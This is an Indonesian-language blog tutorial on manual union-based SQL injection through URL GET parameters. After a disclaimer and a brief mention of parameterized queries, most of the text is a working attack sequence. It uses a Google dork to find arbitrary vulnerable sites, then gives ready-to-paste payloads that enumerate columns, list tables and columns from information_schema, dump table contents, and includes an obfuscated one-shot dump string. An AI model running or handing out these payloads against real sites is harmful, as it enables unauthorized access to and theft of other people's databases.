# Union SQL Injection Manual Sederhana: Metode GET HTTP

**Penulis:** R&D ICWR  
**Tanggal Terbit:** 2024-01-18

### Disclaimer:

**Disclaimer:**  
Disclaimer ini disengaja ditempatkan di bagian atas agar dibaca terlebih dahulu. Tujuan dari pembelajaran berikut adalah untuk keperluan pembelajaran dan peningkatan keamanan pada website saja. Tutorial ini tidak dimaksudkan untuk digunakan dalam aktivitas ilegal seperti dumping database. Jika ada pihak yang menggunakan tutorial ini untuk aktivitas ilegal, hal tersebut bukanlah tanggung jawab kami.

---

SQL injection merupakan teknik serangan keamanan yang memanfaatkan celah pada sistem pengolahan query SQL pada aplikasi web. Pada serangan ini, penyerang menginjeksikan perintah SQL berbahaya ke dalam input aplikasi. Jika aplikasi tidak melakukan validasi atau penyaringan input dengan benar, perintah SQL tersebut dapat dieksekusi oleh database. Salah satu bentuk umum serangan SQL injection terjadi melalui metode GET dalam protokol HTTP, di mana parameter URL dapat dimanipulasi untuk menyisipkan perintah SQL yang membahayakan integritas data atau memungkinkan akses yang tidak sah.

Sebagai contoh, URL yang rentan terhadap SQL injection pada metode GET adalah seperti:  
`http://contoh.com/login.php?username=admin' OR '1'='1' -- &password=abc`  
Dalam contoh ini, penyerang mencoba menyisipkan perintah SQL yang selalu benar, sehingga mengakibatkan akses ke seluruh data dari tabel yang bersangkutan. Untuk menjaga keamanan aplikasi dari serangan SQL injection, sangat penting untuk memvalidasi dan membersihkan input, serta menggunakan teknik parameterized queries atau prepared statements dalam pengolahan query SQL. Pengujian keamanan secara berkala juga diperlukan untuk memastikan tingkat keamanan aplikasi tetap terjaga.

---

Pertama-tama, dalam melakukan penetrasi keamanan pada website, fokus utama adalah mencari target yang menggunakan parameter GET untuk menampilkan data. Pendekatan yang umum dilakukan adalah dengan memanfaatkan query Dork pada mesin pencari Google menggunakan sintaks `inurl:"*.php?id="`.

Contohnya pada kolom search Google sebagai berikut:  
`inurl:"*.php?id="`

Setelah berhasil menemukan website target, seperti contoh `http://contoh.com/get_name?id=1`, langkah selanjutnya adalah melakukan eksploitasi untuk mengidentifikasi potensi kerentanannya terhadap serangan SQL Injection. Pendekatan ini dilakukan dengan memeriksa respons dari server terhadap manipulasi parameter GET.

Untuk menguji kerentanan, tambahkan karakter `'` atau `"` pada bagian paling belakang URL, seperti:

```

[http://contoh.com/get\_name?id=1](http://contoh.com/get_name?id=1)'

```

atau

```

[http://contoh.com/get\_name?id=1](http://contoh.com/get_name?id=1)"

```

Jika website merespon dengan error seperti `Warning: mysqli_num_rows() expects`, kemungkinan besar website tersebut rentan terhadap serangan SQL Injection. Kesalahan ini menunjukkan bahwa input yang diberikan tidak diproses atau disaring dengan benar sebelum dieksekusi oleh database.

Setelah mengidentifikasi kerentanan, langkah selanjutnya adalah menentukan jenis database yang digunakan oleh website dan menyesuaikan teknik serangan. Ini dapat dilakukan dengan menambahkan karakter balancing pada URL, seperti:

- `--` untuk MySQL Linux Style
- `--+` untuk MySQL Windows Style
- `#` hash URL Encode while Use
- `--+-` SQL Comment
- `;%00` Null Byte
- *Backtick*

Contoh:  
`http://contoh.com/get_name?id=1' --+-`

Langkah ini dilakukan untuk mengidentifikasi apakah teknik serangan SQL Injection yang digunakan sesuai dengan karakteristik server dan database yang dimiliki oleh website target.

Setelah mengidentifikasi website yang vulner, penyerang dapat menambahkan karakter balancing seperti `--` (untuk MySQL Linux Style), `--+` (untuk MySQL Windows Style), `#` ( untuk Hash URL Encode while Use), `--+-` (SQL Comment), `;%00` (Null Byte), atau *Backtick* untuk memperoleh respons yang diinginkan.

Langkah selanjutnya dalam proses eksploitasi melibatkan penyuntikan query dengan tujuan mengetahui jumlah kolom pada tabel database. Contohnya, penyerang dapat menggunakan pendekatan berurutan pada parameter GET, seperti:

- `http://contoh.com/get_name?id=1' order by 1--+-` -> Tidak ada error  
- `http://contoh.com/get_name?id=1' order by 2--+-` -> Tidak ada error  
- `http://contoh.com/get_name?id=1' order by 3--+-` -> Tidak ada error  
- `http://contoh.com/get_name?id=1' order by 4--+-` -> Terjadi error, menandakan jumlah kolom pada tabel database adalah 3

Setelah mendapatkan informasi tentang jumlah kolom, penyerang dapat melanjutkan dengan mengidentifikasi letak kolom pada tabel database. Langkah ini dapat dilakukan dengan menggunakan query seperti:

- `http://contoh.com/get_name?id=1' union select 1,2,3--+-`

Website akan menampilkan angka 1, 2, dan 3 sesuai dengan posisi kolom dalam tabel database. Informasi ini nantinya digunakan untuk menyusun query akhir yang akan dieksekusi pada posisi yang diinginkan. Sebagai contoh, untuk menampilkan nama database, penyerang dapat menggunakan query seperti:

- `http://contoh.com/get_name?id=-1' union select 1,database(),3--+-`

Pada tahap selanjutnya eksploitasi SQL Injection setelah mendapatkan informasi ini, penyerang dapat melangkah lebih jauh dengan mengekstrak nama-nama tabel pada database target. Dengan menggunakan query berikut, penyerang dapat mengumpulkan nama-nama tabel tersebut:

- `http://contoh.com/get_name?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+-`

Selanjutnya, setelah berhasil mendapatkan daftar nama-nama tabel, penyerang melanjutkan dengan mengekstrak isi kolom pada tabel-tabel tersebut. Dalam tahapan ini, nama tabel diubah menjadi format heksadesimal yang diawali dengan `0x`:

- `http://contoh.com/get_name?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x6e616d615f746162656c --+-`

Atau dengan menggunakan metode Dump in One Shot SQL Injection:

- `http://contoh.com/get_name?id=-1' union select 1,concat(0x3c623e44756d7020696e204f6e652053686f743c2f623e3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,@c:=0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c),3--+-'`

Dengan mendapatkan nama-nama kolom dari tabel, langkah terakhir adalah menampilkan isi dari kolom-kolom tersebut. Contoh query untuk menampilkan isi kolom pada tabel yang memiliki 3 kolom seperti id, judul, dan detail adalah:

- `http://contoh.com/get_name?id=-1' union select 1,group_concat(id,judul,detail),3 from nama_tabel --+-`

Melalui serangkaian langkah kompleks ini, penyerang dapat berhasil mengeksploitasi dan memperoleh akses tidak sah ke dalam database suatu aplikasi. Penting untuk diingat bahwa praktek-praktek ini hanya dapat digunakan untuk pembelajaran dan pengujian keamanan dengan izin yang sah, dengan tujuan untuk meningkatkan keamanan aplikasi. Etika dan tanggung jawab dalam penggunaan teknik-teknik ini sangat ditekankan untuk mencegah penyalahgunaan.

**Penulis:** Afrizal F.A

---

*Referensi:*

- [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)  
- [https://exploit.linuxsec.org/tutorial-sql-injection-manual/](https://exploit.linuxsec.org/tutorial-sql-injection-manual/)  
- [https://exploit.linuxsec.org/payload-dump-one-shot-sql-injection/](https://exploit.linuxsec.org/payload-dump-one-shot-sql-injection/)  
- [https://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](https://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
